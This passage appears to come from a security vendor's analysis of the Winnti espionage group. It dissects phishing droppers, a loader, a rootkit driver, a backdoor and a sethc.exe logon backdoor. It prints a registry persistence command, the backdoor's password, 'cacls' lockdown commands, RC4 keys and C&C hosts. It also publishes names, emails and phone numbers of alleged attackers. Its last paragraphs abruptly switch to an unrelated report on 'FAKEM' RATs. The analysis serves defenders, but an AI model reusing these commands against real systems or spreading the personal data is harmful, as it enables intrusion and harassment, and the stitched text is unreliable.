C : \WINDOWS\Prefetch\CompanyXYZ EMPLOYEE SALARY ADJ-1AF9D56A.pf Time of creation : 2012 - 09 - 05 19:52:00 ( local timezone , UTC+03 ) Unfortunately , the prefetch file format is proprietary and there is nothing interesting in those files , except the original executable file name .
Full path of the malicious executable that infected the first computer in the company was : C : \Documents and Settings\ < Username > \LocalSettings\Temp\RAR $ EX00.156\CompanyXYZ EMPLOYEE SALARY ADJUSTMENTS EBOOK.EXE According to the file path , this executable was a part of an archive , which was opened with WinRAR installed on the system .
Upon discovery , we requested the Security Officers to provide us with full MIME as well as to check who else may have received the same message .
The check discovered series of emails sent to several publicly known email addresses .
In all cases the text message was the same as shown above , however sent from different mailboxes .
The Return - Path MIME filed seemed to have the original email addresses of the attackers : companyxxyz @ 163.com company.xyz @ gmx.com The attackers used the same IP to send out emails : 118.142.11.114 inetnum : 118.140.0.0 - 118.143.255.255 netname : HGC descr : Hutchison Global Communications country : HK person : ITMM HGC nic - hdl : IH17-AP e - mail : hgcnetwork @ hgc.com.hk address : 9/F Low Block , address : Hutchison Telecom Tower , address : 99 Cheung Fai Rd , Tsing Yi , address : HONG KONG phone : + 852 - 21229555 fax - no : + 852 - 21239523 The emails we checked had the same attachment of 96782 bytes named `` Salary adjustments.zip '' .
There was only one file inside ZIP archive , called `` CompanyXYZ Employee Salary Adjustments Ebook.exe '' .
Full details about this application are provided further down in current report .
To summarize , the targeted attack started from an email sent at 05.09.2012 19:12 ( UTC+03 ) .
It resulted in system infection at 05.09.2012 19:52 ( UTC+03 ) .
Size : 96782 MD5 : 1b56416fefa2d2c863f3b46dfb6dc353 Location : targeted attack email message attachment Creation time ( author 's timezone ) : 2012 - 09 - 05 14:29:10 This file is just a container for `` CompanyXYZ Employee Salary Adjustments Ebook.exe '' .
Size : 122880 MD5 : 6ef66c2336b2b5aaa697c2d0ab2b66e2 Location : `` Salary adjustments.zip '' Creation time : unavailable Link time ( UTC ) : 2012 - 07 - 21 18:50:18 Internal name : FlashUpdate . EXE This application is a wrapper for another embedded executable modules .
It serves as a dropper of malware .
Notable fact : this application has a resource section inside and the default locale is set to Chinese Simplified .
The file creates three long binary data registry keys , two of which are encrypted executable modules and one encrypted config from the body of the original dropper .
These values are encrypted with simple 1-byte XOR .
Sysinfo config module is used by sysbin01 .
Apparently it starts with the company name and has three domain names , one of which is most likely used to check Internet connectivity ( update.microsoft.com ) .
Sysbin01 module is a loader component .
It creates several threads running various jobs .
Sysbin01.thread # 1 attempts to load % TEMP % \ < ComputerName > .ax
file and decrypts it .
We checked the system but could n't find < ComputerName > .ax
file in the Temp folder of the user , however we found other .ax - files
that seemed to be related because of the date of file creation .
File name : C : \Documents and Settings\ % User % \Local Settings\Temp\ % ComputerName % _ p.ax File size : 2660 Creation time ( UTC ) : 2012 - 09 - 06 06:22:42 MD5 : unavailable ( the system went offline before we discovered the filepath ) .
File name : C : \Documents and Settings\ % User % \Local Settings\Temp\uid.ax File size : 16 Creation time ( UTC ) : 2012 - 09 - 06 05:03:06 MD5 : unavailable ( the system went offline before we discovered the filepath ) .
According to the code that loads < ComputerName > .ax
it is an encrypted executable file , which is decrypted and loaded to memory by own loader routine in the sysbin01 module .
Sysbin01.thread # 2 spawns a new instance of Sysbin01.thread # 3 every 10 seconds during , that is done 3 times .
Sysbin01.thread # 3 This thread is the most important .
It reads the configuration from the registry and connects to the C & C servers specified in the config via direct tcp connection or via proxy that is fetched from the the settings of locally logged in user profile .
The config had the following C & C : tank.hja63.com .
It sends a `` POST / < HEXNUMBER > '' request with User - Agent `` lynx '' , the data after HTTP header is just `` AA '' , expected answer is also `` AA '' .
This thread also creates % TEMP % \uid.ax and stores current system unique ID , which is generated by CoCreateGuid system API ( 16 bytes ) .
It is able to receive and save data from the C & C server to a file .
It also monitors windows of explorer.exe and copies textual data from password fields if the user types in , stolen data is saved to a file first .
After all threads are launched , the main thread waits for termination of Sysbin01.thread # 3 , which is created first and then exits .
sysbin02 module behaviors depends on currently running processes .
There is an embedded DLL file according to Figure 15 in sysbin02 .
If the system has a running process named `` 360tray.exe '' , then the embedded file is stored in % SYSTEM % \MFC42LOC.DLL , then copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp and runs a new process from that location via WMI Win32_Process . Create method .
If the system has a running process named `` bdagent.exe '' , then it copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp , decodes an embedded Base64 string and executes .
The string has the following text after decoding : reg add `` HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run '' /v FlashUpdate /t REG_EXPAND_SZ /d `` '' '' '' % APPDATA % \FlashUpdate.exe '' '' '' -update activex '' /f The module also saves current module file path to the registry in the following key location : HKCU\Software\Classes\path Next it patches the tmp file with two dword `` AAAA '' values which looks like corruption of embedded encrypted sysbin modules inside .
The meaning of this action is currently unclear .
Then it moves Flash.tmp file to FlashUpdate.exe by and starts a new process from new location .
Finally , if there is not `` qqpctray.exe '' process running , and this seemed to be the case for the analyzed system , it copies the source executable ( FlashUpdate.exe ) to % TEMP % \Flash.tmp , patches the new file and increases its size by adding system explorer.exe file contents to the resource section `` RC Data '' 20 times .
The purpose of this is to make the new executable look like the real update service of Adobe Flash , it simply stuffs the file with executable code of another application .
Then it moves the file to new location % APPDATA % \FlashUpdate.exe , saves new module file path to the registry in the following key location : HKCU\Software\Classes\path and starts a new process from there .
Size : 15847156 MD5 : 5778178a1b259c3127b678a49cd23e53 Location : C : \WINDOWS\system32\c_20100.NLS Creation time ( UTC ) : unavailable Link time ( UTC ) : 2011 - 09 - 16 13:23:34 c_20100.NLS works in two modes .
The first mode is a load as a dynamic library and the second is a launch as a service .
Both branches have the same core functionality .
This module is a universal executable code loader with no embedded payload .
Its main purpose is to connect to the C & C server , download and store the encrypted payload in the system registry .
It is also responsible for loading , decrypting and running the payload module from the registry after system restart .
c_20100.NLS contains a ciphered block with initial settings .
This ciphered block resides at the very end of the file of this malicious program and is decrypted in the beginning of execution .
Structure of block : The malicious program XORs the magic number with a hardcoded value 0x19860609 , converts a resulted value into a HEX - string and uses that string as a key for RC4 cipher algorithm .
In this case string - key represents `` 00000000 '' because of the magic number is equal to the hardcoded XORing value .
With that key malicious program decrypts ( RC4 ) ciphered archive .
The archive has the following data : Custom LZ - like compression algorithm resembling was used to pack initial settings .
After unpacking the following data appears : The malicious program tries to read registry value `` SrvCode '' by registry path : HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion .
That value is expected to contain ciphered with RC4 data .
To decrypt it program uses 2nd integer of initial settings ( in this case 0x3514 ) XORed by hardcoded byte 0x12 .
Result is converted into a HEX - string and is used as RC4 key for further decryption ( here it is `` 00003506 '' ) .
That registry value appears if this malicious program had already worked on the system and received data from the C & C server in the past .
Content of `` SrvCode '' poses a ciphered executable which should be loaded into the memory and run .
If `` SrvCode '' is not found malware makes attempts to connect to one of the specified C & C servers .
Initial settings define the type of C & C format .
Byte at offset 0x24C stores the C & C type value : 0x00 : the malware uses 4 URL - based C & Cs placed at 0x4C , 0x8C , 0xCC and 0x10C offsets .
By all appearances these are public resources ( forums , blog platforms and so on ) where the attackers leave messages with specially crafted content for a bot .
If connection fails , the malware tries another approach .
0x01 : the malware uses attackers ' hardcoded servers and connects to host and port specified at offsets : 0x14C , 0x18C , 0x1CC and 0x20C .
If connection fails the malware tries another approach .
If URL - based scheme is used then malware loads a web - page by specified in settings URL .
The target text has to begin and end with special hardcoded delimiters : `` B9273C17 '' – start , `` B6A74634 '' – end .
The malware reads contents of the webpages until it finds a proper page with delimiters .
If found , the malware takes the text between delimiters and treats it as data of hex string , converts it to the binary data and decrypts resulted data using RC4 algorithm with hardcoded key `` rtyr_45_trf '' .
For example : '' B9273C17E67024277AE02E2A8A780B243C0BCA88FE85A1B6A7463 '' , The data between delimiters : '' E67024277AE02E2A8A780B243C0BCA88FE85A1 '' , It is converted into binary : 0xe6 0x70 0x24 … 0xa1 and this buffer is decrypted with RC4 key `` rtyr_45_trf '' .
Result is a host and port of C & C : `` nx2.intercpu.com:25 '' .
If the host - port schema is used then malware simply connects to the hardcoded C & C servers directly .
Once a working C & C server is found the malware sends specially crafted ciphered buffer to via TCP / IP .
On request from a bot a C & C server replies with several blocks of data described below : 1st block 0xC bytes of header : 0x1000010 , 0x1000010 , < reserved 4 bytes > .
2nd block 0x1C bytes ( due to absence of real respond from the C & C I ' m presenting an example buffer of this block containing bytes 0x00 , 0x11 , 0x22 , … , 0xFF , 0x00 , 0x0 , 0x0 , … , 0x00 ) : First DWORD of this buffer ( here , 0x33221100 ) is a magic number which is XORed with the value 0x1986052 .
Resulted lowest byte is used to XOR unpacked data .
Word at offset 0x4 ( here , 0x5544 ) poses a checksum of unpacked data which should correspond with actual received content .
DWORD starting at offset 0x8 ( here , 0xBBAA9988 ) represents a size of unpacked data .
Value at marked place at 0xC offset ( in example picture it is dword 0xFFEEDDCC ) represents a size of next block of data to be received .
That data will pose an archive , hence this value represents a size of packed data .
3rd block The 3rd block poses an archive of ciphered data .
Being received , unpacked and decrypted , data is ciphered again with RC4 and stored into `` SrvCode '' value of registry by mentioned above registry path .
The eceived data is processed as an executable file to run .
The malware places the executable in memory , prepares for running and makes call to the entry point of the new code .
Then it waits when following event will be triggered : Global\D5ACF9F6-C8B3 - 47d1 - 9768 - 57162E1F5FDB When triggered , the malware finishes execution .
During the process of finishing it deletes registry value `` SrvCode '' along with values `` DrvCode '' and `` KeyCode '' from the same registry path although this malware was not creating them .
Size : 99912 MD5 : 0b105cd6ecdfe5724c7db52135aa47ef Location : C : \WINDOWS\system32\drivers\tcprelay.sys Creation time ( UTC ) : 2012 - 09 - 05 17:27:04 Link time ( UTC ) : 2011 - 12 - 21 13:55:03 This file is a Microsoft Windows native application , which is loaded as a driver and had a valid digital signature in 2012 .
The certificate was issued by LivePlex Corp , which can be found online by searching for the company name .
One of their webpages is here : http : //www.linkedin.com / company / liveplex When the driver is loaded it decrypts an embedded DLL file , which is immediately injected into the address space of services.exe process .
Then the driver sets up some rootkit functionality to hide TCP connections by patching the system tcp / ip driver .
The injected DLL was called s.dll at the time of compilation and is yet another module for analysis .
Size : 77825 MD5 : 1716889fcee461e7cde5128c14d206cb Location : inside tcprelay.sys Creation time ( UTC ) : 2012 - 09 - 05 17:27:04 Link time ( UTC ) : 2011 - 03 - 01 09:07:12 This opens system event named `` 401d - b49a-93cf7a18e5b3 '' and sets event to fired state if it exists .
The code checks for proxy server configuration by impersonating a logged in user and fetching settings from the registry .
It can work both with Socks and HTTP proxies .
The module attempts to connect to the list of 8 domains , consisting of the following command and control servers ( some of them are used more than once ) : a1.googletrait.com a1.nexongame.net a1.reegame.net mail.nexongame.net It automatically looks for open C & C ports in the following order 53,443,8080,25,80,3690,1433,80 .
During connection over HTTP proxy it uses the following User - Agent string : `` MyApp/0 '' .
The application is linked with libmysql.dll and Zlib ( v.1.2.3 ) .
Current Zlib version is 1.2.7 and was released on 2nd May 2012 , while version 1.2.3 seems to be released in July 2005 .
Zlib version 1.2.4 was released on March 2010 , so the original module was probably designed somewhere after July 2005 and before March 2010 .
Then it collects system information , which includes the following : Host name OS Service Pack version System default language ID and Code page List of local drives with free space Internal hardcoded identifier ( `` 12 - 21 '' ) Process commandline Logged in user name System directory path Amount of free system memory CPU name Terminal services port number The information is stored in a buffer that begins with hardcoded header magic number : 0xDF1F1ED3 .
The block is compressed using Zlib ( v.1.2.3 ) compress2 method with compression level 8 .
The data is compressed later and prepended by a 4-bytes header as shown below .
After submitting system information the module expects 4 byte response code from the server after which it sends one 00 byte to complete the handshake procedure .
Then the module expects an interactive communication session with the remote operator .
It provides capability to run various commands including ( command names were defined during reverse engineering ) : process_list kill_process dir_list smbshare_list smbshare_mount dir_make file_delete file_move file_upload file_open file_write file_close file_find url_download_to_file process_start process_start_and_get_output dll_load dll_call_export screen_getsnapshot screen_set_cursor_position screen_send_input tcpproxy_open_connection tcpproxy_close_connection mysql_connect mysql_fetch mysql_disconnect driver_tcpreplay_interact tcpsession_close quit A command output is compressed using Zlib and sent to the server in asynchronous mode .
To summarize , it is obvious that this executable module is a backdoor , capable of taking screenshots , stealing files , downloading new files from the Internet , starting and killing processes , including interactive Windows shell commands , file search and interaction with mysql database server .
Size : 405504 MD5 : cf119a66d4c3e2355c1ec4ac316a7130 Location : C : \RECYCLER\en.exe Creation time ( UTC ) : 2012 - 09 - 06 04:08:53 Link time ( UTC ) : 2009 - 11 - 17 16:02:04 This application is a dropper , it fetches a resource called EXEFILE from current application and saves it into following paths : < CURRENT DIR > \dllcache\sethc.exe C : \WINDOWS\system32\sethc.exe Then the module uses undocumented Windows API from SFC_OS.dll , a function called SfcFileException to update the system version of C : \WINDOWS\system32\sethc.exe .
The file C : \WINDOWS\system32\sethc.exe ( SET High Contrast ) is to enable the High Contrast accessibility feature in order to allow people with visual impairments to log in .
SETHC is activated at logon screen with LeftAlt+LeftShift+PrintScreen key combination .
By replacing C : \Windows\SYSTEM32\SETHC.EXE with a custom application an attacker can run an arbitrary application with SYSTEM privileges running in zero session ( in separate desktop space from normal applications ) .
After the new file replaced the system sethc.exe application , current module adjusts the privileges of sethc.exe to disable access to the file from any other application .
This is achieved by calling external system tools cacls .
Replace access rights to the files , allow everyone full access : cacls C : \WINDOWS\system32\sethc.exe /c /e /p everyone : f cacls < CURRENT DIR > \dllcache\sethc.exe /c /e /p everyone : f Revoke access to the file for everyone , leave only system readonly access : cacls C : \WINDOWS\system32\sethc.exe /t /c /e /r everyone cacls C : \WINDOWS\system32\sethc.exe /t /c /e /r administrators cacls C : \WINDOWS\system32\sethc.exe /t /c /e /r users cacls C : \WINDOWS\system32\sethc.exe /t /c /e /r system cacls C : \WINDOWS\system32\sethc.exe /t /c /e /r `` Power Users '' cacls C : \WINDOWS\system32\sethc.exe /c /e /p system : r The dropper also changes the file timestamp .
It is set identical to C : \WINDOWS\system32\ntvdm.exe .
The dropper application has a resource section with Menu , Dialog templates and other information put by the MS Visual Studio Application Wizard .
It includes default system locale from the developer 's system , which is Chinese Simplified .
The dropped application ( from resource EXEFILE ) is described below as sethc.exe .
Size : 20480 MD5 : 3ba06424e8244f17a8d269c4d40c39c9 Location : resource section of En.exe Link time ( UTC ) : 2009 - 05 - 16 07:09:35 This small file has very basic functionality .
It is written using MS Visual C++ with MFC and is used to render a simple dialog window .
Like En.exe it has resource section , describing the dialog window and default locale is set to Chinese Simplified .
Once it replaced local system sethc.exe tool it can be invoked when the desktop is locked with LeftCtrl+LeftShift+PrintScr key combination .
This brings a dialog Window similar to system StickyKeys application .
However , if you press Ctrl+Alt+F you will immediately see a hidden input box .
If you enter `` ydteam '' in the input box and press Ctrl+Alt+K , the application will welcome you with a message box and will execute a TaskManager .
As far as sethc.exe is executed with privileges of local system , the task manager also inherits these privileges and is capable of killing any other process as well as starting any other application with system rights .
Apparently , this is a backdoor to the system .
An attacker can run cmd.exe , add local users with administrative privileges and log in .
We checked if the tool was publicly shared on the Internet , but could n't find a page distributing it freely .
That is why we assume that it is developed and used privately .
Below is full list of all collected domains and IP - addresses of C & C servers have they been mentioned in initial settings of c_20100.nls or hidden in text messages at public places in Internet : C & Cs from public resources : 27.115.103.198:8885 27.115.103.195:8885 114.222.36.32:10000 27.115.103.195:23456 27.115.103.195:10000 nx2.joymax.in:80 nx3.joymax.in:80 nx2.intercpu.com:25 ( 174.36.138.30 ) nx3.intercpu.com:25 ( 174.36.138.30 ) nx3.interdriver.net:53 ( 119.240.212.110 ) stan227.guicp.net:8008 Hardcoded C & C from the malware : service.interdriver.net:443 ( 98.126.218.64 , 199.188.106.231 ) service.googlefiles.net:53 ( 98.126.218.64 , 199.188.106.231 ) service.dell-support.org:25 service.hp-supports.com:80 tank.hja63.com a1.googletrait.com a1.nexongame.net a1.reegame.net mail.nexongame.net Interestingly , there is an overlap of C & Cs from public resources and hardcoded domains : nx3.interdriver.net:53 < = = = > service.interdriver.net:443 The nx3.interdriver.net was published by awertasegfae @ yahoo.com and was discovered at http : //awertasegfae.blogspot.ru/2011/10/first - test.html .
This means that at least the individual who owns awertasegfae @ yahoo.com for sure belongs to the same gang who attacked CompanyXYZ .
So , who is behind Winnti ? While analyzing the malicious files that we detected during our investigations we found some details which may cast some light on the source of the attacks .
As part of our investigation , we monitored exactly what the cybercriminals did on an infected PC .
In particular , they downloaded an auxiliary program ff._exe to the Config . Msi folder on the infected machine .
This code searches for HTML , MS Excel , MS Word , Adobe , PowerPoint and MS Works documents and text files ( .txt
) on the hard drive .
Debugging lines were found in ff._exe _ that possibly point to the nationality of the cybercriminals .
They were not immediately noticeable because they looked like this in the editor : However , during a detailed analysis it emerged that the text is in Chinese Simplified GBK coding .
This is what these lines look in Chinese : Below is a machine translation of this text into English : In addition , cybercriminals used the AheadLib program to create malicious libraries ( for details , see the second part of the article ) .
This is a program with a Chinese interface .
Chinese text was also found in one of the components of the malicious program CmdPlus.dll plug - in : It would appear that the attackers can at least speak Chinese .
However , not everything is so clear cut : because the file transfer plug - in has not been implemented entirely safely , a command which includes the attackers ' local path ( where the file comes from and where it is saved to ) arrives during the process of downloading / uploading files on the infected system .
While monitoring the cybercriminals ' activity on the infected machine , we noticed they uploaded the certificate they found in the infected system , and the network traffic reflected the local path indicating the place where they saved the file on their computer : These characters appear to be Korean , meaning `` desktop '' .
This means the attackers were working on a Korean Windows operating system .
Therefore , we can presume that the attack is not exclusively the work of Chinese- speaking cybercriminals .
Locating the attacker is one of the most non - trivial parts of the research .
The attackers normally do not leave any traces in the malware that can be directly bound to their real identities .
That is why we have to use all available bits of information that seems to find other unique related content on the Internet or any other available data sources .
One of the important stages is to extract unique identifiers / nicknames / tags that can be discovered on the Internet and after that find individuals who are related to creation or distribution of this content .
The string `` ydteam '' looked non - random and we decided to check it on the Internet .
It turned out that YDteam is a hackers group name and has a lot of references on Chinese segment of the Internet : There was a website ydteam.cn that seems to be related to the activity of the group .
According to the domaintools.com database , it was registered on 2009 - 10 - 06 15:12 and put on hold around 2010 - 10 - 08 .
The original WHOIS information from domaintools.com : Registrant name 魏楠 ( Wei Nan ) seems to be represented in the mailbox wn6805 @ 126.com , which could mean the owner of the website used real identity .
The domain was most likely registered by the team leader .
The email itself was used on several other websites .
For example The webpage above has a post offering to `` help with cheap shopping online '' .
That is most likely related to a fraudulent activity of the email owner ( stolen Internet - banking credentials or credit card information ) .
The same page reveals a QQ i d of that individual and a username : Another page http : //www.gtvod.com / gtvod / jsp / public / personal / index.jsp ? id=20100127213936126005 shows information about the user registered with name `` wn3118 '' and the same email : Another page http : //tieba.baidu.com / p/652667782 has a message from profile `` 灬low - key , wn '' ( which links to wn6805 @ 126.com ) .
Profile information reveals gender of the individual : There are few essays in Chinese probably written by the individual owning wn6805 @ 126.com while studying at Junior High School : A page from zww.cn also shows some details about the author : http : //www.zww.cn / zw / myzw.asp ? u= % CA % A7 % C8 % A5 % B0 % AE Searching for the QQ i d 251985076 brings to http : //blog.sina.com.cn / dahuadl that has User mobile number : 13847416805 The hackers team also seemed to own ydteam.com for some time according to reference at http : //zzsky.5d6d.net / archiver / tid-127.html Domaintools.com shows that the domain was registered to a Chinese individual from 2009 - 06 - 03 to 2011 - 08 - 22 .
After that WHOIS information was protected by a Privacy protection service .
Here is WHOIS data at the time of domain registration : Please note , that + 8613652452428 is a Chinese local cell phone number .
Domaintools.com has also preserved a screenshot of the website while it was online on 2010 - 02 - 25 .
It shows some of the team member names mentioned above .
Another trace to the source of attack is based on email sender IP address .
The emails were sent from 118.142.11.114 .
According to robtex.com , there are 2 domain names that share this IP : Pad62.com was created in 2011 - 06 - 05 , on the date of registration if had non - protected WHOIS information , according to domaintools.com : We checked which other domains are associated with the WHOIS information above and found the following domain names : One more route is to check the C & C of the initial dropper / downloader module .
This was tank.hja63.com .
Acccording to domain tools , hja63.com had non - protected WHOIS information in 2011 : When we checked , tank.hja63.com resolved to 173.234.184.45 ( owned by DiaHosting Limited , USA ) , while hja63.com resolved to 68.178.232.100 ( GoDaddy ISP server ) .
Analysis of the file c_20100.nls revealed additional information leading to probable attackers .
Looking for identifiers ( used as message boundaries , or delimiters ) B9273C17 and B6A74634 specified in this malicious file on Internet we found the following pages where the attackers left messages for the bots : Another place of just mentioned forum thread : Here , we see these emails used as commenters ' identifiers : Jimycoco … @ gmail.com awertase ...
@ yahoo.com Jimycoco … @ gmail.com most probably refers to Jimycocowell which is a username that pops up further .
Searching for `` awertase '' brought another forum thread where ciphered data for the same bot appeared : http : //osdir.com / ml / openmeetings - dev/2011 - 09/msg00364.html The full email behind awertase ...
@ xxxxxxxx seems to be awertasegfae @ yahoo.com according to http : //awertasegfae.blogspot.ru/2011/10/first - test.html http : //hi.baidu.com / alonecode / item/6936f85a3d98ce3533e0a9ed According to Figure 32 , `` mer4en7y '' and `` alonecode '' ( from the URL of the page ) are nicknames which are related to the user of the Baidu blog platform where messages for a bot were left .
Google Search for the nickname '' mer4en7y '' returned 5490 results .
This is a very active user that posts messages for this type of bot .
The first results lead to hacker forums and IT - security specific web - platforms .
The same nickname has appeared on a well- known Romanian Security Team forum .
According to the following , Mer4en7y submitted a vulnerability found in Weihai City Commercial Bank system : http : //wooyun.org / bugs / wooyun-2010 - 011002 Favorite videos and tutorials of Mer4en7y : http : //www.tdcqjslt.com / u.php ? uid=1918 Mer4en7y 's micro - blogging page at t.qq.com : http : //t.qq.com / mer4en7y Alias of that profile is translated as `` watching a rain '' .
A user with nickname `` d4nr4n '' ( http : //t.qq.com / d4nr4n ) is posting a message where mer4en7y is mentioned : Google translation : `` % mentioned individuals % go to Nanjing tomorrow xx training institutions to maintain four months … C++ learning , seeking Nanjing - based friends of the exchange '' Mer4en7y at yoyo2008.com : http : //www.yoyo2008.com / home.php ? mod = space & uid=41498 Mer4en7y profile at yoyo2008.com One of two friends of Mer4en7y in yoyo2008 social network is a user named `` mayuan '' which seems to be from Xinjiang and a graduate of Judicial Police School according to shared private information out there : http : //u.pintour.com / uid - b1bf56e230cc42d9bfa003a7718888d2/ Mer4en7y 's exploit has been involved in the penetration of public radio service ftp server ( according to WHOIS information this domain belongs to Xi'an Municipal Bureau of Radio and Television ) .
As we can see here Mer4en7y had an email address associated with 90sec hackers team .
Another reference on the net shows that Mer4en7y is after sourcecode of proprietary products ( probably udf.dll from Roxio Inc ) : http : //www.uedbox.com / udf - dll - source/ The following confirms that Mer4en7y is a member of 90sec group .
The group website is located at http : //www.90sec.org/ : Mer4en7y replies on job offer posted at 90sec forum ( someone wanted to hire computer exerts with very special knowledge ) : https : //forum.90sec.org / viewthread.php ? action = printable & tid=2012 Rough translation of job offer from Chinese : '' Subject : Looking for information security researcher From : Southland sword Time : 2012 - 04 - 06 00:38 Subject : Security researcher job Responsibilities : 1 .
Full target penetration alone or with a team depending on available resources ; 2 .
Penetration testing report and recommendations Technical requirements : 1 .
Knowledge of penetration testing , methods , processes , proficiency in a variety of penetration testing tools ; 2 .
Knowledge of common Web development languages ( asp , php , jsp ) , experience with SQL - injection , XSS , common websecurity exploits and patches ; 3 .
Experience with all kinds of operating systems and databases for common security vulnerabilities ; 4 .
Good verbal and written language skills ; 5 .
Be able to work in a team ; individuals who lose trust , do not listen to the teamleader and not accepting the rules will be kicked out ; Work Location : Guangdong ( OR Guangzhou Shenzhen ) Baochibaozhu package , Relatively free playing time .
Salary : monthly allocation of the total amount of work and cooperation share more than 1W .
Vacancies : 5 people For candidates : first contact me ( preferably work resume ) , after my check the resume will be passed to the head coordinator for arranging a personal meeting .
Salary : free meal and apartments , office location is in a senior villa suite of 200 square meters , computers are available but please bring your own hard drive with environment and tools you are familiar with .
Even a single completed project will provide you with money for your monthly expenses .
Powerful background .
No comments ! Tho who are competent , please contact : Email : Infosec @ cntv.cn QQ : admin @ inessus.com '' And Mer4en7y 's replied to this job offer : Which can be translated as : `` Are n't you recruiting people for APT ? Guangzhou is too far , but anyway I support it '' .
There are some interesting comments in the mentioned forum thread regarding reference `` Powerful background '' in job offer .
People in the thread speculated that it could mean the work is supported by the government .
Mer4en7y is publishing an exploit : http : //www.hackqing.com / index.asp ? FoxNews=129.html Mer4en7y published a modified Perl script for network scan : http : //www.2cto.com / kf/201110/109200.html Let 's continue with other places where delimiters have been found : https : //www.myspace.com/574064782/blog http : //www.wuhanbike.net / home.php ? mod = space & uid=15845 & do = profile http : //jimycocowell.blogspot.ru/ The attacker left two messages .
The very first one is labeled as `` first home '' / `` first love '' and contains a ciphered C & C domain as described above , i.e .
C & C domain is encrypted with RC4 algorithm and its hex binary value is presented in text format between delimiters .
But the next message dubbed `` second '' contains a ciphered C & C domain too but it is encoded in another way : The initial C & C domain is XORed with fixed byte value and the resulted data is transformed using BASE64 encoding .
The resulted text is inserted between the same delimiters .
By all appearances this method is used in the next version of the backdoor which is the subject of current research ( see c_20100.NLS ) .
It is also possible that programs with support of either this or that encryption could be used simultaneously in the frame of one attack .
Between all found messages for the bot the second type of messages ( BASE64 ) is significantly prevalent .
A link to this `` Jimycocowell home '' is also present at following place of `` bitgodgod '' user : http : //www.blogger.com / profile/06442609461818597659 We have located one sample of Winnti malware with a hardcoded C & C : mail.7niu.com .
Domaintools information about the domain : Domain Name : 7niu.com PunnyCode : 7niu.com Creation Date : 2006 - 06 - 11 00:00:00 Updated Date : 2012 - 01 - 27 21:35:57 Expiration Date : 2016 - 06 - 11 00:00:00 Registrant : Organization : qi tou niu Name : xibei jiao Address : beijing City : beijing Province / State : Beijing Country : CN Postal Code : 100000 Administrative Contact : Name : xibei jiao Organization : qi tou niu Address : beijing City : beijing Province / State : Beijing Country : beijing Postal Code : 100000 Phone Number : 86 -- 1321333333 Fax : 86 -- 010555555 Email : bit_bugbug @ tom.com Technical Contact : Name : xibei jiao Organization : qi tou niu Address : beijing City : beijing Province / State : Beijing Country : CN Postal Code : 100000 Phone Number : 86 -- 1321333333 Fax : 86 -- 010555555 Email : rain @ etang.com You can see how similar `` bitbugbug '' and `` bitgodgod '' .
Both are directly related to Winnti activity .
The email address `` bit_bugbug @ tom.com '' also can be found on Chinese websites about home rentals : http : //oldhouse.0379home.com / RentView-1108.html We have located another individual calling himself Yang .
He distributed bot control commands and was quite active on the internet as well .
http : //yang8559420.blog.163.com/ Search for `` yang8559420 '' brought some results : Yang is a distributor of resources ( maps or programs ) for applications based on ArcGIS Engine ( http : //www.esri.com / software / arcgis / arcgisengine ) http : //shop65775432.taobao.com/ ? spm = a1z0b.7.2 - 2442034955.3.rfLsIS Information about the seller : http : //shop65775432.taobao.com / view_page-74445421.htm Yang is certified at alipay.com ( see field `` Certification '' above ) : http : //help.alipay.com / lab / help_detail.htm ? help_id=211779 Yang left some feedback about a coat : http : //www.yifa8.com/4/766/770/763311.html Yang is selling glasses : http : //webcache.googleusercontent.com / search ? q = cache : susBSuR_5zoJ : re.taobao.com/search % 3Frefpid % 3Dmm _ 16823808_2252954_8791633 % 26keyword % 3D % 2525D5 % 2525E6 % 2525CB % 2525BF % 252520 % 2525C1 % 2525AC % 2525D2 % 2525C2 % 2525C8 % 2525B9 % 252520 % 2525C7 % 2525E5 % 2525B2 % 2525D6 % 26back % 3Dlo1 % 25253D0 % 252 526lo2 % 25253D0 % 252526nt % 25253D1 % 26isinner % 3D1 % 26yp4p_page % 3D3 % 26posid % 3D7 + % 22yang8559420 % 2 2 & cd=14 & hl = ru & ct = clnk & gl = ru http : //bbs.iaixue.com / home.php ? mod = space & uid=217 & do = profile User : lovemeyang ( probably related to Yang ) .
Signature is a message for a bot : So , both Yang8559420 and Lovemeyang messages go with signature : http : //bbs.iaixue.com / forum.php ? mod = viewthread & tid=261 http : //bbs.iaixue.com / forum.php ? mod = viewthread & tid=612 … Search for `` lovemeyang '' returned too much data , making it difficult tofilter out those identifying possible attackers – false positives are highly - probable .
However , it 's worth mentioning that the following link refers to an account with the `` lovemeyang '' username and the user has earlier posted blogs relating to IT - security , so possibly the user is that Yang who is involved in the attack : http : //lovemeyang.blog.51cto.com/659880/195451 Our research revealed long - term oriented large scale cyber - espionage campaign of a criminal group with Chinese origins .
These attacks are not new , many other security researchers have published details of various cybercriminal groups coming from China .
However , the current hacking group has distinguishable features that make it stand out among others : - Massive abuse of digital signatures ; the attackers used digital signatures of one victim company to attack other companies and steal more digital certificates ; - Usage of kernel level 64-bit signed rootkit ; - Abusing great variety of public Internet resources to store control commands for the malware in an encrypted form ; - Sharing / selling stolen certificates to other groups that had different objectives ( attacks against Uyghur and Tibetan activists ) ; - Stealing source code and other intellectual property of software developers in online gaming industry .
The Winnti hacking group is not the first and not the last .
By making our research paper available to the public , we hope that it will not only spread the knowledge among security researchers but also will help system administrators and security officials in all type of organizations around the world to learn the tactics and tools of the perpetrators .
We hope that our shared knowledge will help to better protect IT infrastructure .
We also hope that our message will reach Chinese law enforcement agencies .
If the current research is not enough to initiate criminal investigation , we hope that it will be enough at least to make some checks and probably prevent other malicious activity from reaching out foreign countries and business within China .
The perpetrators of targeted attacks aim to maintain persistent presence in a target network in order to extract sensitive data when needed .
To maintain persistent presence , attackers seek to blend in with normal network traffic and use ports that are typically allowed by firewalls .
As a result , many of the malware used in targeted attacks utilize the HTTP and HTTPS protocols to appear like web traffic .
However , while these malware do give attackers full control over a compromised system , they are often simple and configured to carry out a few commands .
Attackers often use remote access Trojans ( RATs ) , which typically have graphical user interfaces ( GUIs ) and remote desktop features that include directory browsing , file transfer , and the ability to take screenshots and activate the microphone and web camera of a compromised computer .
Attackers often use publicly available RATs like Gh0st , PoisonIvy , Hupigon , and DRAT , and `` closed - released '' RATs like MFC Hunter and PlugX.1 However , the network traffic these RATs produce is well - known and easily detectable although attackers still successfully use them.2 Attackers always look for ways to blend their malicious traffic with legitimate traffic to avoid detection .
We found a family of RATs that we call `` FAKEM '' that make their network traffic look like various protocols .
